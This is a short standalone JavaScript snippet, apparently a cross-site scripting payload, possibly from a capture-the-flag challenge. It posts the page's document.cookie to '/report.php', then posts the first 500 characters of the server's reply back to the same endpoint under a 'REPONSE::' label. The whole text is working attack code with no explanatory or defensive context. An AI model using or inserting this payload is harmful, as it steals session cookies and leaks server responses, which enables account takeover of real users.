fetch('/report.php', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'url=' + document.cookie
}).then(r => r.text()).then(t => {
  fetch('/report.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'url=REPONSE::' + encodeURIComponent(t.substring(0, 500))
  });
});
